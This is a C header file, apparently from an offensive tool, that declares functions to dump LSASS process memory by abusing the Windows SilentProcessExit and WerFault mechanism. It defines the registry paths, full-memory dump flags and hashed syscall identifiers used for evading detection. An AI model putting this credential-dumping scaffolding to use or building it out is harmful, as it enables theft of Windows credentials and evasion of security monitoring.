#pragma once

#include <windows.h>
#include <winternl.h>

#include "ntdefs.h"
#include "dinvoke.h"
#include "syscalls.h"

#define SystemErrorPortTimeouts 0x73

typedef VOID(WINAPI *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI *RtlAppendUnicodeToString_t)(PUNICODE_STRING Destination, PCWSTR Source);
typedef VOID(WINAPI *RtlFreeUnicodeString_t)(PUNICODE_STRING UnicodeString);
typedef NTSTATUS(NTAPI* RtlReportSilentProcessExit_t) (HANDLE ProcessHandle, NTSTATUS ExitStatus);

#define RtlInitUnicodeString_SW2_HASH 0x7B6E73FC
#define RtlAppendUnicodeToString_SW2_HASH 0x8626F2C6
#define RtlFreeUnicodeString_SW2_HASH 0x68A85C74
#define RtlReportSilentProcessExit_SW2_HASH 0x91BFF14B

#define IFEO_REG_KEY L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
#define SILENT_PROCESS_EXIT_REG_KEY L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"
#define LOCAL_DUMP 0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define MiniDumpWithFullMemory 0x2

BOOL werfault_silent_process_exit(
    DWORD lsass_pid,
    LPCSTR dump_folder);

BOOL werfault_create_thread(
    HANDLE hProcess);
